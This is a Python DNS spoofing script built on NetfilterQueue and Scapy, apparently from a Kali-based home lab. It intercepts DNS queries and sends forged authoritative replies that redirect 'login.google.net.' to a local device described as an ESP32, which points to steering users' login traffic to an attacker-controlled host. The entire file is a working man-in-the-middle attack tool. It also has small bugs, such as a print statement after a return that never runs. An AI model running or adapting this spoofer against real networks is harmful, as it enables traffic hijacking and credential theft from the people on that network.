from netfilterqueue import NetfilterQueue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, Raw, send
import os

# This is where we redirect ALL domains to
# For now pointing to Kali(23) itself — later we change to ESP32 IP
REDIRECT_IP = "192.168.1.21" # Now changing to ESP32 IP (previous 23)
TARGET_DOMAIN = "login.google.net."

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    if scapy_packet.haslayer(DNSQR):
        queried_domain = scapy_packet[DNSQR].qname.decode()
        print(f"[*] DNS Query intercepted: {queried_domain}")

        if queried_domain == TARGET_DOMAIN:
            print(f"[*] Intercepted {queried_domain}. Sending spoofed reply...")

	# Craft fake DNS reply
        dns_reply = (
            IP(dst=scapy_packet[IP].src, src=scapy_packet[IP].dst) /
            UDP(dport=scapy_packet[UDP].sport, sport=53) /
            DNS(
                id=scapy_packet[DNS].id,
                qr=1,       # This is a reply
                aa=1,       # Authoritative answer
                qd=scapy_packet[DNS].qd,
                an=DNSRR(
                    rrname=scapy_packet[DNSQR].qname,
                    ttl=10,
                    rdata=REDIRECT_IP
                )
            )
        )

        send(dns_reply, verbose=0)
        packet.drop()
        return
        print(f"[+] Redirected {queried_domain} → {REDIRECT_IP}")

    packet.accept()

print("[*] DNS Spoofer started. Waiting for queries...")
nfqueue = NetfilterQueue()
nfqueue.bind(0, process_packet)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print("\n[!] Stopping DNS spoofer...")
    os.system("sudo iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0")
    print("[*] iptables rule removed. Exiting.")
